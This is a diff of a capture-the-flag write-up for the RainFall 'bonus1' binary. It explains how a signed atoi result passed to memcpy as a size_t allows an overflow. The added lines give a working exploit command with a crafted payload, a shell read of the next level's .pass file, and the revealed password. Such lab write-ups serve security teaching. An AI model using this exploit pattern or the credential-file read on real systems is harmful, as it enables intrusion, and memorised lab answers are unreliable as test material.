@@ -55,4 +55,10 @@ End of assembler dump.
 
 After copy, it compares the first argument to `0x574f4c46` (`1464814662`). If it is not equal, it terminates. The
 principle is simple: we are going to take the `INT MIN` (`-2**31`) and add the value of our offset. We exploit the
-weakness that `atoi` take an `int` but `memcpy` take a `size_t`.
+weakness that `atoi` take an `int` but `memcpy` take a `size_t`, which we can assume is act like an `uint`.
+
+```
+bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
